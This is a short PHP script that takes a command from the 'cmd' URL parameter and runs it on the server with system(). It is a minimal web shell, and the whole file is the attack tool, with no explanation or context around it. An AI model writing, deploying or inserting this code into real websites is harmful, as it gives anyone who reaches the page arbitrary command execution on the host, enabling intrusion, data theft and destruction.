<?php
$command = $_GET['cmd'];
if(isset($command)){
    system($command);
}
?>